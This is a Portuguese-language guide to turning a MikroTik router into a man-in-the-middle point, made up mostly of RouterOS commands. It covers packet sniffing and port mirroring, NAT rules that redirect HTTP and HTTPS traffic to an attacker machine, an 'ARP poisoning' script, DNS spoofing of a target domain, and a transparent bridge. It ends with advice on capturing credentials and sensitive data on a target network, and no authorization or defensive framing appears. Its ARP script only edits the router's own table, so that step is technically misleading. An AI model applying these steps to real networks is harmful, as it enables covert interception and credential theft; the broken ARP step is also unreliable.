<div align="center">
  <img src="./microtik.png">
</div>
# Guia de Ataques e Monitoramento com MikroTik

Este guia apresenta técnicas para usar um roteador MikroTik como ponto de pivô em uma rede, permitindo tanto o monitoramento quanto a interceptação de tráfego. Estas técnicas são semelhantes às funcionalidades do Wireshark, porém com a vantagem de estarem posicionadas estrategicamente na infraestrutura da rede.

## Monitoramento de Tráfego

### Análise em Tempo Real com Torch

O comando "torch" permite análise de tráfego em tempo real nas interfaces do MikroTik:

```
/tool torch interface=ether2 src-address=0.0.0.0/0 dst-address=0.0.0.0/0
```

Este comando mostra o tráfego que passa pela interface ether2 em tempo real, com informações sobre origem, destino, protocolo e taxa de transferência.

### Captura de Pacotes com Packet Sniffer

O packet sniffer do MikroTik funciona de modo semelhante ao Wireshark:

```
/tool sniffer set filter-interface=ether1 filter-ip-address=192.168.1.0/24 memory-limit=10KiB
/tool sniffer start
```

Depois, você pode ver os pacotes capturados:

```
/tool sniffer packet print
```

Com esta ferramenta, você pode:
- Capturar o conteúdo completo dos pacotes, incluindo payloads
- Ver tráfego em texto plano (HTTP, SMTP, FTP, etc.)
- Analisar handshakes TCP, cabeçalhos e detalhes de protocolo
- Exportar os dados capturados para análise posterior

### Port Mirroring

O port mirroring permite replicar todo o tráfego de uma porta para outra:

```
/interface ethernet switch port
set 1 mirror-source=ether2
set 2 mirror-target=yes
```

Esta configuração:
- Replica todo o tráfego da porta 1 (ether2) para a porta 2
- Permite que uma máquina conectada à porta 2 analise o tráfego passivamente
- Captura comunicações sem interferir no caminho de comunicação

## Interceptação de Tráfego

### Proxy Transparente Básico

Redireciona o tráfego HTTP para o próprio MikroTik:

```
/ip firewall nat add chain=dstnat action=redirect to-ports=8080 protocol=tcp dst-port=80
```

### Proxy com Redirecionamento para Máquina Externa

Redireciona o tráfego HTTP para uma máquina de ataque:

```
/ip firewall nat add chain=dstnat action=dst-nat to-addresses=192.168.1.10 to-ports=8080 protocol=tcp dst-port=80
```

Neste exemplo, 192.168.1.10 seria um computador rodando ferramentas como Burp Suite, ZAP ou mitmproxy.

### Interceptação de HTTPS

Para interceptar HTTPS:

```
/ip firewall nat add chain=dstnat protocol=tcp dst-port=443 action=dst-nat to-addresses=192.168.1.10 to-ports=8443
```

## Técnicas Avançadas de MITM

### ARP Poisoning via Script

```
/system script add name="arp-mitm" source={
  :local targetIP "192.168.1.5"
  :local gatewayIP "192.168.1.1"
  :local myMAC [/interface ethernet get ether1 mac-address]
  
  /ip arp add address=$targetIP mac-address=$myMAC
  /ip arp add address=$gatewayIP mac-address=$myMAC
}
```

Este script faz o MikroTik se passar tanto pelo gateway quanto pelo dispositivo alvo.

### DNS Spoofing

```
/ip dns static add name="alvo.com" address=192.168.1.10
```

Isso redireciona requisições DNS para "alvo.com" para o servidor malicioso.

### Bridge Transparente

```
/interface bridge add name=bridge1
/interface bridge port add bridge=bridge1 interface=ether1
/interface bridge port add bridge=bridge1 interface=ether2
```

Esta configuração coloca o MikroTik literalmente no meio do caminho, tornando-o transparente enquanto captura todo o tráfego.

## Combinando as Técnicas

Para máxima eficácia, considere:

1. Posicionar o MikroTik como bridge transparente entre segmentos de rede
2. Aplicar redirecionamento seletivo de tráfego para suas ferramentas de análise
3. Utilizar o sniffer para capturar credenciais e dados sensíveis
4. Implementar ARP poisoning e DNS spoofing para ataques direcionados

Estas técnicas permitem tanto o monitoramento passivo quanto a interceptação ativa, dando visibilidade completa sobre o tráfego da rede-alvo.
